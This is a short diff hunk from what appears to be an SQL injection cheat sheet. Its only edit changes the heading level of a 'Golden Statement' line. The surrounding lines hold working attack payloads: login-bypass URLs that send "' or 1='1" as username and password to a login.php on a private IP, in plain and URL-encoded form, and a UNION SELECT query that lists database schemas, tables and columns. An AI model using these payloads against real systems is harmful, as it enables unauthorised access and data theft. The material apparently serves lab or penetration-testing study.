@@ -7,7 +7,7 @@ ________________________________________________________________________________
     http://10.50.33.78/login.php?username='+or+1%3D'1&passwd='+or+1%3D'1
     http://10.50.33.78/login.php?username=%27+or+1%3D%271&passwd=%27+or+1%3D%271
 _________________________________________________________________________________________________________________
-## Golden Statement: 
+# Golden Statement: 
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 
 -----------------------------------[column],[column],[column]----------------------[database],[table]------------
